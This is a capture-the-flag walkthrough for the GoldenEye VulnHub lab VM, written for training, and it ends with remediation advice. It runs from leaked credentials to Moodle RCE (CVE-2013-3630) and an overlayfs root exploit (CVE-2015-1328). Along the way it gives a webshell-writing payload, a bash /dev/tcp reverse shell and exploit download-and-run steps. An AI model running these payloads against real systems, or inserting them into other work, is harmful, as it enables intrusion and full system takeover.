# GoldenEye: 1 — Writeup

**Difficulty:** Intermediate  
**Category:** VulnHub — Boot2Root  
**OS:** Ubuntu 14.04.1 LTS (Trusty Tahr) x86\_64  
**Kernel:** 3.13.0-32-generic  
**Platform:** [VulnHub](https://www.vulnhub.com/entry/goldeneye-1,240/)

---

## Overview

GoldenEye is a Bond-themed Linux boot2root VM. The path to root involves chaining together a JavaScript credential leak, POP3 enumeration, a Moodle credential chain, an authenticated RCE via a misconfigured spellchecker (CVE-2013-3630), and a Linux kernel privilege escalation via overlayfs (CVE-2015-1328).

**Vulnerabilities exploited:**
- Information disclosure via JavaScript source (`terminal.js`)
- Weak POP3 credentials (plain-text email credential chain)
- CVE-2013-3630 — Moodle 2.2.3 PSpellShell RCE (admin → www-data shell)
- CVE-2015-1328 — Linux overlayfs LPE (www-data → root)

---

## Prerequisites

- VirtualBox with Host-Only network adapter
- Kali Linux (or any Linux attacker machine on the same subnet)
- Tools: `nmap`, `nc`, `curl`, `strings`, `wget`, `searchsploit`

---

## Attack Summary

```
terminal.js HTML-encoded password
  → boris:InvincibleHack3r (HTTP Basic Auth /sev-home/)
  → POP3 natalya:bird → email: xenia:RCP90rulez! + domain
  → Moodle xenia login → doak username discovered
  → POP3 doak:goat → email: dr_doak:4England!
  → Moodle dr_doak → s3cret.txt → image → base64 → admin:xWinter1995x!
  → CVE-2013-3630 aspell RCE → www-data shell
  → CVE-2015-1328 overlayfs exploit (EDB-37292) → root
  → /root/.flag.txt: 568628e0d993b1973adc718237da6e93
```

---

## Enumeration

### Host Discovery

```bash
netdiscover -r 192.168.56.0/24
# or
arp-scan --localnet
# Result: 192.168.56.101  08:00:27:9F:6A:BF  PCS Systemtechnik GmbH (VirtualBox)
```

### Port Scan

```bash
nmap -sV -p- 192.168.56.101
```

```
PORT      STATE SERVICE    VERSION
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3   Dovecot pop3d
55007/tcp open  pop3       Dovecot pop3d
```

Note: POP3 runs on non-standard ports 55006 (SSL) and 55007 (plaintext).

### Service Enumeration

**HTTP — Port 80**

```bash
curl -s http://192.168.56.101/
# Page: "GoldenEye Primary Admin Server"
# Source hints at: <script src="terminal.js"></script>
# and a login at /sev-home/
```

Read the JavaScript file:

```bash
curl -s http://192.168.56.101/terminal.js
```

```javascript
//Boris, make sure you update your default password.
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

Decode HTML entities (Python):

```python
import html
print(html.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;"))
# InvincibleHack3r
```

**Credentials found:** `boris:InvincibleHack3r`

---

## Exploitation

### Step 1: HTTP Basic Auth Login

```bash
curl -u "boris:InvincibleHack3r" http://192.168.56.101/sev-home/
```

The page confirms POP3 access is available and hints at additional users (natalya, xenia).

### Step 2: POP3 Credential Chain

**Add domain to `/etc/hosts`** (required for later steps):

```bash
echo "192.168.56.101 severnaya-station.com" | sudo tee -a /etc/hosts
```

**Read natalya's email (port 55007):**

```bash
nc 192.168.56.101 55007
USER natalya
PASS bird
LIST
RETR 2
QUIT
```

Email #2 reveals:
```
username: xenia
password: RCP90rulez!
domain:   severnaya-station.com/gnocertdir
```

**Login to Moodle as xenia** at `http://severnaya-station.com/gnocertdir`:
- Browse to Messages → note a message mentioning the user `doak`

**Read doak's email:**

```bash
nc 192.168.56.101 55007
USER doak
PASS goat
RETR 1
QUIT
```

Email reveals:
```
username: dr_doak
password: 4England!
```

### Step 3: Extract Admin Password from Moodle

**Login as dr_doak** at `http://severnaya-station.com/gnocertdir/login/index.php`:

1. Go to **Profile → My Private Files**
2. Download `s3cret.txt`

```
s3cret.txt contents:
"I left a secret for james in his home directory"
Path: /dir007key/for-007.jpg
```

Download the image and extract the embedded secret:

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
strings for-007.jpg | tail -5
# eFdpbnRlcjE5OTV4IQ==

echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# xWinter1995x!
```

**Admin credentials:** `admin:xWinter1995x!`

### Step 4: Moodle RCE via CVE-2013-3630 (aspell PSpellShell)

**Vulnerability:** Moodle 2.2.3 allows admins to configure the aspell path used by TinyMCE's spellchecker. When `PSpellShell` is selected as the spell engine, the configured path is executed as a shell command.

**Login as admin** and get the session key:

```bash
MOODLE="http://severnaya-station.com/gnocertdir"
COOKIE=/tmp/admin_cookie.txt

curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$MOODLE/login/index.php" \
  -d "username=admin&password=xWinter1995x!" -L > /dev/null

SESSKEY=$(curl -s -b "$COOKIE" "$MOODLE/admin/settings.php?section=systempaths" \
  | grep -o '"sesskey":"[^"]*"' | head -1 | cut -d'"' -f4)
```

**Enable PSpellShell spell engine:**

```bash
curl -s -b "$COOKIE" -X POST "$MOODLE/admin/settings.php?section=editorsettingstinymce" \
  --data-urlencode "sesskey=$SESSKEY" \
  --data-urlencode "section=editorsettingstinymce" \
  --data-urlencode "s_editor_tinymce_spellengine=PSpellShell"
```

**Set aspell path to a webshell writer:**

```bash
curl -s -b "$COOKIE" -X POST "$MOODLE/admin/settings.php?section=systempaths" \
  --data-urlencode "sesskey=$SESSKEY" \
  --data-urlencode "section=systempaths" \
  --data-urlencode 's__aspellpath=echo "<?php if(isset($_GET[\"c\"])){echo shell_exec($_GET[\"c\"]);} ?>" > /var/www/html/gnocertdir/ws.php'
```

**Trigger the spellcheck endpoint to execute the command:**

```bash
SPELLCHECK="$MOODLE/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php"

echo '{"id":"c0","method":"checkWords","params":["en",["x"]]}' | \
curl -s -b "$COOKIE" -X POST -H "Content-Type: application/json" \
  --data-binary @- "$SPELLCHECK"
```

**Verify RCE:**

```bash
curl "http://severnaya-station.com/gnocertdir/ws.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Upgrade to interactive reverse shell:**

```bash
# Attacker — start listener
nc -lvnp 4444

# Via webshell — send reverse shell
curl "http://severnaya-station.com/gnocertdir/ws.php" \
  --get --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'"
```

---

## Privilege Escalation

### CVE-2015-1328 — Linux Overlayfs LPE

**Affected kernel:** 3.13.0-32-generic (Ubuntu 14.04) — vulnerable range: 3.13.0 < 3.19

Verify from the shell:

```bash
uname -r
# 3.13.0-32-generic
```

On the attacker machine:

```bash
searchsploit -p 37292
# Path: /usr/share/exploitdb/exploits/linux/local/37292.c

cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/ofs.c

# Replace gcc with cc (gcc not installed on target)
sed -i 's/gcc -fPIC/cc -fPIC/g' /tmp/ofs.c
```

Transfer exploit to the target (via webshell or reverse shell):

```bash
# Attacker: serve the file
python3 -m http.server 8000

# On target reverse shell:
cd /tmp
wget http://192.168.56.102:8000/ofs.c
cc ofs.c -o ofs
chmod +x ofs
./ofs
```

Expected output:

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

---

## Root Flag

```bash
cat /root/.flag.txt
```

```
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

**Bonus:** `http://192.168.56.101/006-final/xvf7-flag/` — victory page.

---

## Credentials Summary

| User | Password | Method |
|------|----------|--------|
| boris | InvincibleHack3r | HTML entity decode from terminal.js |
| natalya | bird | POP3 brute force (port 55007) |
| doak | goat | POP3 brute force (port 55007) |
| xenia | RCP90rulez! | natalya POP3 email |
| dr_doak | 4England! | doak POP3 email |
| admin | xWinter1995x! | base64 decode from dr_doak private file |

---

## Lessons Learned

1. **Never expose credentials in client-side code** — even obfuscated (HTML entities, base64). A browser's developer tools or `curl` trivially decodes them.
2. **Use standard ports** — non-standard ports (55006, 55007) don't hide services from a full port scan.
3. **Moodle admin access = RCE** — CVE-2013-3630 is a known consequence of allowing admin-configurable system paths. Restrict Moodle admin accounts rigorously.
4. **Patch the kernel** — CVE-2015-1328 (overlayfs) was patched in Ubuntu 14.04.2+. Running an unpatched 14.04.1 kernel is a critical risk.
5. **When `gcc` is missing**, `cc` (usually Clang) compiles most C exploits without modification.

---

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| terminal.js credential disclosure | Remove credentials from JS; use server-side authentication |
| Weak POP3 passwords | Enforce strong passwords; use fail2ban; disable unused mailboxes |
| CVE-2013-3630 (Moodle RCE) | Upgrade Moodle; restrict admin account access; disable PSpellShell |
| CVE-2015-1328 (overlayfs LPE) | Upgrade to Ubuntu 14.04.2+ (kernel ≥ 3.13.0-49); disable user namespaces (`sysctl -w kernel.unprivileged_userns_clone=0`) |
